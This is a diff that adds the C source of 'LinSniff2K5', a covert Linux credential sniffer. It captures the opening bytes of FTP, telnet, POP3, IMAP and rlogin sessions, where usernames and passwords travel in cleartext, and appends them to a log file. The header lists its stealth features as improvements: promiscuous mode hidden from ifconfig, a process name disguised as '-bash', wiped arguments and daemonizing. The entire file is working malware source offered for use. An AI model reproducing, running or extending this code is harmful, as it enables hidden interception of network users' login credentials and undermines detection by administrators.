@@ -1,0 +1,404 @@
+/************************************************************************
+ * LinSniff2K5 - based on LinSniff666 - (which was based on linsnifer)  *
+ *            09/12/2004  - sirius_black / LOTFREE Team                 *
+ *                  http://www.lsdp.net/~lotfree/                       *
+ *                    and Merry Christmas !! :p                         *
+ ************************************************************************
+ * A few improvements I made on Linsniff666 :                           *
+ * - hide from a 'ps' by changing the process name to '-bash'           *
+ * - use setsockopt to enter promiscuous mode (invisible with ifconfig) *
+ * - give the PID of the child process (usefull to kill the sniffer)    *
+ * - possibility to chose the interface to listen (default is eth0)     *
+ * - the proggie don't care about the ethernet layer no more (ETH_P_IP) *
+ *                                                                      *
+ * The major modification is that linsniff2k5 don't record extra data.  *
+ * Linsniff666 considers that the tcp header length is always 20 bytes  *
+ * so when it receives a tcp header of 32 or 40 bytes it records        *
+ * respectively 12 or 20 bytes it should not record.                    *
+ * This problem a been corrected in this version.                       *
+ ************************************************************************
+ *  Usage :    "./linsniff2k5"    or    "./linsniff2k5 <interface>"     *
+ ************************************************************************/
+
+// LinSniffer 0.666
+// by humble of rhino9
+// I am not responsible for what you do with this.
+
+// This is like linsniffer, but it uses a linked list
+// so it won't ignore any connections.
+
+// based on original code by Mike Edulla
+
+// how many bytes do you want to capture per connection?
+// it mallocs this much memory for each connection so don't
+// make it too high
+#define MAXIMUM_CAPTURE 256
+// how long before we stop watching an idle connection?
+#define TIMEOUT 30
+// log file name?
+#define LOGNAME "tcp.log"
+
+#define PROCESS "-bash"
+#define DEFAULT_IF "eth0"
+#define IF_LEN 16
+
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <sys/time.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <string.h>
+#include <linux/if.h>
+#include <linux/if_packet.h>
+#include <signal.h>
+#include <stdio.h>
+#include <arpa/inet.h>
+#include <linux/socket.h>
+#include <linux/ip.h>
+#include <linux/tcp.h>
+#include <linux/if_ether.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <sys/ioctl.h>
+
+int sock;
+FILE *logfile;
+
+struct connection 
+{
+  struct connection *next;
+
+  time_t start;
+  time_t lasthit;
+
+  unsigned long saddr;
+  unsigned long daddr;
+  unsigned short sport;
+  unsigned short dport;
+
+  unsigned char data[MAXIMUM_CAPTURE];
+  int bytes;
+};
+
+typedef struct connection *clistptr;
+
+clistptr head,tail;
+
+void add_node(unsigned long sa, unsigned long da,unsigned short sp,unsigned short dp)
+{
+  clistptr newnode;
+
+  newnode=(clistptr)malloc(sizeof(struct connection));
+  newnode->saddr=sa;
+  newnode->daddr=da;
+  newnode->sport=sp;
+  newnode->dport=dp;
+  newnode->bytes=0;
+  newnode->next=NULL;
+  time(&(newnode->start));
+  time(&(newnode->lasthit));
+  if (!head)
+  {	
+    head=newnode;
+    tail=newnode;
+  }
+  else
+  {
+    tail->next=newnode;
+    tail=newnode;
+  }
+}
+
+char *hostlookup(unsigned long int in)
+{
+  static char blah[1024];
+  struct in_addr i;
+  struct hostent *he;
+
+  i.s_addr=in;
+  he=gethostbyaddr((char *)&i, sizeof(struct in_addr),AF_INET);
+  if(he == NULL) strcpy(blah, inet_ntoa(i));
+  else strcpy(blah, he->h_name);
+  return blah;
+}
+
+char *pretty(time_t *t)
+{ 
+  char *time;
+  time=(char*)ctime(t);
+  time[strlen(time)-6]=0;
+  return time;
+}
+
+int remove_node(unsigned long sa, unsigned long da,unsigned short sp,unsigned short dp)
+{
+  clistptr walker,prev;
+  int i=0;
+  int t=0;
+  if (head)
+  {
+    walker=head;
+    prev=head;
+    while (walker)
+    {
+      if (sa==walker->saddr && da==walker->daddr && sp==walker->sport && dp==walker->dport)
+      {
+	prev->next=walker->next;
+	if (walker==head)
+	{
+	  head=head->next;;
+	  prev=NULL;
+	}
+	if (walker==tail)
+	  tail=prev;
+	fprintf(logfile,"============================================================\n");
+	fprintf(logfile,"Time: %s     Size: %d\nPath: %s",pretty(&(walker->start)),walker->bytes,hostlookup(sa));
+	fprintf(logfile," => %s [%d]\n------------------------------------------------------------\n",hostlookup(da),ntohs(dp));
+	fflush(logfile);
+	for (i=0;i<walker->bytes;i++)
+	{
+	  if (walker->data[i]==13)
+	  {
+	    fprintf(logfile,"\n"); 
+	    t=0; 
+	  }
+	  if (isprint(walker->data[i]))
+	  {
+	    fprintf(logfile,"%c",walker->data[i]);
+	    t++;
+	  }
+	  if (t>75)
+	  {
+	    t=0;
+	    fprintf(logfile,"\n");
+	  }
+	}
+	fprintf(logfile,"\n");
+	fflush(logfile);
+	free (walker);
+	return 1;	
+      }
+      prev=walker;
+      walker=walker->next;
+    }
+  }	
+}
+
+int log_node(unsigned long sa, unsigned long da,unsigned short sp,unsigned short dp,int bytes,char *buffer)
+{
+  clistptr walker;
+
+  walker=head;
+  while (walker)
+  {
+    if (sa==walker->saddr && da==walker->daddr && sp==walker->sport && dp==walker->dport)
+    {
+      time(&(walker->lasthit));
+      strncpy(walker->data+walker->bytes,buffer,MAXIMUM_CAPTURE-walker->bytes);
+      walker->bytes=walker->bytes+bytes;
+      if (walker->bytes>=MAXIMUM_CAPTURE)
+      {
+	walker->bytes=MAXIMUM_CAPTURE;
+	remove_node(sa,da,sp,dp);
+	return 1;
+      }	
+    }
+    walker=walker->next;
+  }
+}	
+
+
+void setup_interface(char *device);
+void cleanup(int);
+
+
+struct ip_packet
+{
+  struct iphdr  ip;
+  struct tcphdr tcp;
+  char buff[8192];
+} ipp;
+
+struct iphdr *ip;
+struct tcphdr *tcp;
+
+void cleanup(int sig)
+{
+  if (sock)
+    close(sock);
+  if (logfile)
+  {
+    fprintf(logfile,"\nExiting...\n");
+    fclose(logfile);
+  }
+  exit(0);
+}
+
+void purgeidle(int sig)
+{
+  clistptr walker;
+  time_t curtime;	
+  walker=head;
+  signal(SIGALRM, purgeidle);
+  alarm(5);
+  //printf("Purging idle connections...\n");
+
+  time(&curtime);
+  while (walker)
+  {
+    if (curtime - walker->lasthit  > TIMEOUT)
+    {
+      //printf("Removing node: %d,%d,%d,%d\n",walker->saddr,walker->daddr,walker->sport,walker->dport);
+      remove_node(walker->saddr,walker->daddr,walker->sport,walker->dport);
+      walker=head;
+    }
+    else
+      walker=walker->next;
+  }
+}
+
+void setup_interface(char *device)
+{
+  struct ifreq ifr;
+  struct packet_mreq mr;
+  struct sockaddr_ll sll;
+	
+  ifr.ifr_ifindex=0;
+  //open up our magic PF_PACKET
+  sock=socket(PF_PACKET, SOCK_DGRAM, htons(ETH_P_IP));
+  if(sock<0)
+  {
+    perror("socket");
+    exit(1);
+  }
+
+  memset(&ifr,0,sizeof(ifr));
+  //set our device into promiscuous mode
+  strncpy(ifr.ifr_name, device,sizeof(ifr.ifr_name));
+  if(ioctl(sock, SIOCGIFINDEX, &ifr)<0)
+  {
+    close(sock);
+    perror("cant get flags");
+    exit(1);
+  }
+
+  sll.sll_family=AF_PACKET;
+  sll.sll_ifindex=ifr.ifr_ifindex;
+  sll.sll_protocol=htons(ETH_P_ALL);
+
+  if(bind(sock,(struct sockaddr*)&sll,sizeof(sll))<0)
+  {
+    perror("bind");
+    exit(1);
+  }
+
+  memset(&mr,0,sizeof(mr));
+  mr.mr_ifindex=ifr.ifr_ifindex;
+  mr.mr_type=PACKET_MR_PROMISC;
+  //we now use setsockopt... Promiscuous mode will be invisible ti ifconfig :p
+  if(setsockopt(sock,SOL_PACKET,PACKET_ADD_MEMBERSHIP,&mr,sizeof(mr))<0)
+  {
+    perror("setsockopt error");
+    exit(1);
+  }
+}
+
+int filter(void)
+{
+  int p;
+  p=0;
+  int opt_len;
+
+  if(ip->protocol != 6) return 0;
+	
+  p=0;
+  if (htons(tcp->dest) == 21) p= 1;
+  if (htons(tcp->dest) == 23) p= 1;
+  if (htons(tcp->dest) == 110) p= 1;
+  if (htons(tcp->dest) == 143) p= 1;
+  if (htons(tcp->dest) == 513) p= 1;
+  if (!p) return 0;
+		
+  if(tcp->syn == 1)
+  {
+    //printf("Adding node syn %d,%d,%d,%d.\n",ip->saddr,ip->daddr,tcp->source,tcp->dest);
+    add_node(ip->saddr,ip->daddr,tcp->source,tcp->dest);
+  }
+  if(tcp->rst == 1)
+  {
+    //printf("Removed node rst %d,%d,%d,%d.\n",ip->saddr,ip->daddr,tcp->source,tcp->dest);
+    remove_node(ip->saddr,ip->daddr,tcp->source,tcp->dest);
+  }
+  if(tcp->fin == 1)
+  {
+    //printf("Removed node fin %d,%d,%d,%d.\n",ip->saddr,ip->daddr,tcp->source,tcp->dest);
+    remove_node(ip->saddr,ip->daddr,tcp->source,tcp->dest);
+  }
+  opt_len=4*tcp->doff-sizeof(ipp.tcp);
+  log_node(ip->saddr,ip->daddr,
+           tcp->source,tcp->dest,
+	   htons(ip->tot_len)-sizeof(ipp.ip)-sizeof(ipp.tcp)-opt_len,
+	   ipp.buff+opt_len);
+}
+
+
+int main(int argc, char *argv[])
+{
+  int x,dn;	
+  clistptr c;
+  char interface[IF_LEN];
+  int i;
+
+  printf("LinSniff 2K5\n");
+  head=tail=NULL;
+
+  ip=(struct iphdr *)((unsigned long)&ipp.ip);
+  tcp=(struct tcphdr *)((unsigned long)&ipp.tcp);
+
+  if(argc>1)
+    strncpy(interface,argv[1],IF_LEN-1);
+  else
+    strcpy(interface,DEFAULT_IF);
+
+  printf("Listening interface %s\n",interface);
+  //a simple trick to hide in process
+  for(i=0;i<argc;i++)
+    bzero(argv[i],strlen(argv[i]));
+  strcpy(argv[0],PROCESS);
+  if (fork()==0)
+  {
+    printf("Child PID is %d\n",getpid());
+    close(0); close(1); close(2);
+    setsid();
+    dn=open("/dev/null",O_RDWR);
+    dup2(0,dn); dup2(1,dn); dup2(2,dn);
+    close(dn);
+    setup_interface(interface);
+
+    signal(SIGHUP, SIG_IGN);
+    signal(SIGINT, cleanup);
+    signal(SIGTERM, cleanup);
+    signal(SIGKILL, cleanup);
+    signal(SIGQUIT, cleanup);
+    signal(SIGALRM, purgeidle);
+      
+    logfile=fopen(LOGNAME,"a");
+    if (logfile == NULL) 
+    { 
+      fprintf(stderr, "cant open log\n");
+      exit(0);
+    }
+
+    alarm(5);
+
+    while (1)
+    {
+      x=read(sock, (struct ip_packet*)&ipp, sizeof(struct ip_packet));
+      if (x>1)
+      {
+	filter();
+      }
+    }
+  }
+  return 0;
+}
